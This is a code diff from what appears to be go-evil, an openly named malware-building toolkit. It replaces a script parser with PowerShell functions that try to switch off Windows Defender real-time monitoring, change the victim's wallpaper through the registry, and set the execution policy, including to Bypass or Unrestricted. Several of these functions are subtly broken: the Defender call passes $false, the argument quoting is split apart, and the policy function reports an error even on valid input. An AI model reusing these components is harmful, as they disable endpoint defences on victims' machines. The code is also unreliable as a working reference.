+++ domains/powershell/powershell.go
@@ -1,75 +1,40 @@
 package powershell
 
 import (
-	"regexp"
+	"fmt"
+	"os/exec"
+	"runtime"
+	"strings"
 
-	mal "github.com/s9rA16Bf4/go-evil/domains/malware/private"
+	run_time "github.com/s9rA16Bf4/go-evil/utility/variables/runtime"
 	"github.com/s9rA16Bf4/notify_handler/go/notify"
+	"gopkg.in/go-rillas/subprocess.v1"
 )
 
-const (
-	EXTRACT_SUBDOMAIN      = "(powershell|#pwsh)\\.(.+)\\.(.+)\\(.*\\);" // Captures subdomain and function
-	EXTRACT_FUNCTION_VALUE = ".+\\(\"(.*)\"\\);"                         // Grabs the value being passed to the function
-	EXTRACT_FUNCTION       = "(powershell|#pwsh)\\.(.+)\\(.*\\);"        // This is for the cases when we don't have a subdomain
-)
-
-func Parse(new_line string) {
-	regex := regexp.MustCompile(EXTRACT_FUNCTION_VALUE)
-	result := regex.FindAllStringSubmatch(new_line, -1)
-	var value string
-	if len(result) > 0 {
-		value = result[0][1]
-	} else {
-		value = "NULL"
-	}
-	regex = regexp.MustCompile(EXTRACT_SUBDOMAIN)
-	result = regex.FindAllStringSubmatch(new_line, -1)
-
-	if len(result) > 0 { // There is a subdomain to extract
-		subdomain := result[0][2]
-		function := result[0][3]
-
-		switch subdomain {
-		case "disable":
-			switch function {
-			case "defender":
-				mal.AddContent("pwsh.Disable_defender()")
-			default:
-				function_error(function)
-			}
-		case "change":
-			switch function {
-			case "wallpaper":
-				mal.AddContent("pwsh.Change_wallpaper(\"" + value + "\")")
-			default:
-				function_error(function)
-			}
-		case "set":
-			switch function {
-			case "execution_policy":
-				mal.AddContent("pwsh.Change_wallpaper(\"" + value + "\")")
-			default:
-				function_error(function)
-			}
-
-		default:
-			subdomain_error(subdomain)
-		}
-	} else { // There might be a function which doesn't require a subdomain to work
-		regex = regexp.MustCompile(EXTRACT_FUNCTION)
-		result = regex.FindAllStringSubmatch(new_line, -1)
-		if len(result) > 0 {
-			function := result[0][1]
-			switch function {
-			default:
-				function_error(function)
-			}
-		}
+func Disable_defender() {
+	if runtime.GOOS == "windows" {
+		arg := "-command \"Set-MpPreference -DisableRealtimeMonitoring $false\""
+		exec.Command("powershell", strings.Split(arg, " ")...).Run()
 	}
 }
-func subdomain_error(subdomain string) {
-	notify.Error("Unknown subdomain '"+subdomain+"'", "powershell.Parse()")
+
+func Change_wallpaper(path_to_new_wallpaper string) {
+	if runtime.GOOS == "windows" {
+		path_to_new_wallpaper = run_time.Check_if_variable(path_to_new_wallpaper)
+		resp := subprocess.RunShell("powershell", "-Command", "{", "set-itemproperty", "-path", "\"HKCU:Control Panel\\Desktop\"", "-name", "WallPaper", "-value", path_to_new_wallpaper, "}")
+		fmt.Println(resp)
+		subprocess.RunShell("powershell", "-Command", "{", "Start-Sleep", "-s", "10", "}")
+		subprocess.RunShell("powershell", "-Command", "{", "rundll32.exe", "user32.dll", ",", "UpdatePerUserSystemParameters", ",", "0", ",", "$false", "}")
+
+	}
 }
-func function_error(function string) {
-	notify.Error("Unknown function '"+function+"'", "powershell.Parse()")
+
+func Execution_Policy(new_policy string) { // This command most likely requires admin on all systems
+	policys := []string{"AllSigned", "Bypass", "Default", "RemoteSigned", "Restricted", "Undefined", "Unrestricted"}
+	for _, policy := range policys {
+		if policy == new_policy { // its valid
+			subprocess.RunShell("powershell", "-Command", "{Set-ExecutionPolicy", "-ExecutionPolicy ", new_policy, "}")
+		}
+	}
+	notify.Error("Unknown policy +"+new_policy, "powershell.ExecutionPolicy()")
 }
